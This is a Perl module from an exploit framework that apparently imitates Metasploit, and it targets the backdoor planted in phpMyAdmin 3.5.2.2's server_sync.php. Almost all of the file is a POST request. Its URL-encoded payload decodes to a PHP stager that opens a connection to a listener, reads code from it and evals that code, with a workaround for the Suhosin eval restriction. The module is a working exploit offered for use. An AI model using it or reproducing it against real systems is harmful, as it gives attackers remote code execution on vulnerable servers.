package MSFPerlExploits::PHPMYADMIN::MSF::3522_backdoor;
use parent qw(P1rK3r::Exploit P1rK3r::Services::PHPMYADMIN);use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

use P1rK3r::Functions::Basic;
use P1rK3r::Functions::Errors;
use P1rK3r::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "3522_backdoor";

   my $DETECTION = {

   };

   my $EXPLOIT = {

        NAME => '3522_backdoor',
        TYPE => 'MSF',
        PLATFORM => 'MULTI',
        REQUESTS => {
                EXPLOIT1 => {
                        METHOD       => 'POST',
                        PATH         => 'server_sync.php',
                        PAYLOAD      => 'c=%2f%2a%3c%3f%70%68%70%20%2f%2a%2a%2f%20%65%72%72%6f%72%5f%72%65%70%6f%72%74%69%6e%67%28%30%29%3b%20%24%69%70%20%3d%20%27%31%32%37%2e%30%2e%30%2e%31%27%3b%20%24%70%6f%72%74%20%3d%20%34%34%36%35%3b%20%69%66%20%28%28%24%66%20%3d%20%27%73%74%72%65%61%6d%5f%73%6f%63%6b%65%74%5f%63%6c%69%65%6e%74%27%29%20%26%26%20%69%73%5f%63%61%6c%6c%61%62%6c%65%28%24%66%29%29%20%7b%20%24%73%20%3d%20%24%66%28%22%74%63%70%3a%2f%2f%7b%24%69%70%7d%3a%7b%24%70%6f%72%74%7d%22%29%3b%20%24%73%5f%74%79%70%65%20%3d%20%27%73%74%72%65%61%6d%27%3b%20%7d%20%69%66%20%28%21%24%73%20%26%26%20%28%24%66%20%3d%20%27%66%73%6f%63%6b%6f%70%65%6e%27%29%20%26%26%20%69%73%5f%63%61%6c%6c%61%62%6c%65%28%24%66%29%29%20%7b%20%24%73%20%3d%20%24%66%28%24%69%70%2c%20%24%70%6f%72%74%29%3b%20%24%73%5f%74%79%70%65%20%3d%20%27%73%74%72%65%61%6d%27%3b%20%7d%20%69%66%20%28%21%24%73%20%26%26%20%28%24%66%20%3d%20%27%73%6f%63%6b%65%74%5f%63%72%65%61%74%65%27%29%20%26%26%20%69%73%5f%63%61%6c%6c%61%62%6c%65%28%24%66%29%29%20%7b%20%24%73%20%3d%20%24%66%28%41%46%5f%49%4e%45%54%2c%20%53%4f%43%4b%5f%53%54%52%45%41%4d%2c%20%53%4f%4c%5f%54%43%50%29%3b%20%24%72%65%73%20%3d%20%40%73%6f%63%6b%65%74%5f%63%6f%6e%6e%65%63%74%28%24%73%2c%20%24%69%70%2c%20%24%70%6f%72%74%29%3b%20%69%66%20%28%21%24%72%65%73%29%20%7b%20%64%69%65%28%29%3b%20%7d%20%24%73%5f%74%79%70%65%20%3d%20%27%73%6f%63%6b%65%74%27%3b%20%7d%20%69%66%20%28%21%24%73%5f%74%79%70%65%29%20%7b%20%64%69%65%28%27%6e%6f%20%73%6f%63%6b%65%74%20%66%75%6e%63%73%27%29%3b%20%7d%20%69%66%20%28%21%24%73%29%20%7b%20%64%69%65%28%27%6e%6f%20%73%6f%63%6b%65%74%27%29%3b%20%7d%20%73%77%69%74%63%68%20%28%24%73%5f%74%79%70%65%29%20%7b%20%63%61%73%65%20%27%73%74%72%65%61%6d%27%3a%20%24%6c%65%6e%20%3d%20%66%72%65%61%64%28%24%73%2c%20%34%29%3b%20%62%72%65%61%6b%3b%20%63%61%73%65%20%27%73%6f%63%6b%65%74%27%3a%20%24%6c%65%6e%20%3d%20%73%6f%63%6b%65%74%5f%72%65%61%64%28%24%73%2c%20%34%29%3b%20%62%72%65%61%6b%3b%20%7d%20%69%66%20%28%21%24%6c%65%6e%29%20%7b%20%64%69%65%28%29%3b%20%7d%20%24%61%20%3d%20%75%6e%70%61%63%6b%28%22%4e%6c%65%6e%22%2c%20%24%6c%65%6e%29%3b%20%24%6c%65%6e%20%3d%20%24%61%5b%27%6c%65%6e%27%5d%3b%20%24%62%20%3d%20%27%27%3b%20%77%68%69%6c%65%20%28%73%74%72%6c%65%6e%28%24%62%29%20%3c%20%24%6c%65%6e%29%20%7b%20%73%77%69%74%63%68%20%28%24%73%5f%74%79%70%65%29%20%7b%20%63%61%73%65%20%27%73%74%72%65%61%6d%27%3a%20%24%62%20%2e%3d%20%66%72%65%61%64%28%24%73%2c%20%24%6c%65%6e%2d%73%74%72%6c%65%6e%28%24%62%29%29%3b%20%62%72%65%61%6b%3b%20%63%61%73%65%20%27%73%6f%63%6b%65%74%27%3a%20%24%62%20%2e%3d%20%73%6f%63%6b%65%74%5f%72%65%61%64%28%24%73%2c%20%24%6c%65%6e%2d%73%74%72%6c%65%6e%28%24%62%29%29%3b%20%62%72%65%61%6b%3b%20%7d%20%7d%20%24%47%4c%4f%42%41%4c%53%5b%27%6d%73%67%73%6f%63%6b%27%5d%20%3d%20%24%73%3b%20%24%47%4c%4f%42%41%4c%53%5b%27%6d%73%67%73%6f%63%6b%5f%74%79%70%65%27%5d%20%3d%20%24%73%5f%74%79%70%65%3b%20%69%66%20%28%65%78%74%65%6e%73%69%6f%6e%5f%6c%6f%61%64%65%64%28%27%73%75%68%6f%73%69%6e%27%29%20%26%26%20%69%6e%69%5f%67%65%74%28%27%73%75%68%6f%73%69%6e%2e%65%78%65%63%75%74%6f%72%2e%64%69%73%61%62%6c%65%5f%65%76%61%6c%27%29%29%20%7b%20%24%73%75%68%6f%73%69%6e%5f%62%79%70%61%73%73%3d%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e%28%27%27%2c%20%24%62%29%3b%20%24%73%75%68%6f%73%69%6e%5f%62%79%70%61%73%73%28%29%3b%20%7d%20%65%6c%73%65%20%7b%20%65%76%61%6c%28%24%62%29%3b%20%7d%20%64%69%65%28%29%3b',
                        TEXT         => 'Sending First Exploit Request On : /server_sync.php',
                        HEADERS      => {
                           'Content-Type' => 'application/x-www-form-urlencoded',
                        },
                        VALIDATION   => {
                           TCODE => ['200'],
                        },
                },
        },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;